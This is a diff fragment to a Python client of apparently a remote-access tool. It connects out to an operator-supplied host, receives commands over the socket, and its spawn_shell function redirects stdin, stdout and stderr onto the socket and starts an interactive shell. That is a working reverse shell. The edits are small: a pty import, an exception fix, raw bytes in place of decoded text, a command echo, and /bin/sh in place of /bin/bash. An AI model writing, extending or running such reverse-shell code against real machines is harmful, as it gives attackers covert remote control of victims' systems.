@@ -10,6 +10,7 @@ import imutils
 import platform
 import time
 import threading
+import pty
 
 BUFFER_SIZE = 1024 * 128
 
@@ -27,7 +28,7 @@ class Client:
 		self.s = socket.socket()
 		try:
 			self.s.connect((sys.argv[1], port))
-		except (socket.error, exc):
+		except (socket.error):
 			print("[!] Couldn't connect to host.")
 			exit(1)
 
@@ -49,7 +50,7 @@ class Client:
 	
 	def recv(self):
 		msg_size = int(self.recvall(HEAD))
-		return self.recvall(msg_size).decode()
+		return self.recvall(msg_size)
 
 	def get_client_socket(self):
 		return self.s
@@ -92,7 +93,7 @@ def spawn_shell(s):
 		os.dup2(s.fileno(), 0)
 		os.dup2(s.fileno(), 1)
 		os.dup2(s.fileno(), 2)
-		subprocess.run(["/bin/bash","-i"])
+		subprocess.run(["/bin/sh","-i"])
 		os.dup2(stdin, 0)
 		os.dup2(stdout, 1)
 		os.dup2(stderr, 2)
@@ -152,6 +153,7 @@ def main():
 	s = client.get_client_socket()
 	while True:
 		command = client.recv().strip()
+		print(command)
 		if not command:
 			break
 		splitted_command = command.split(" ", 1)
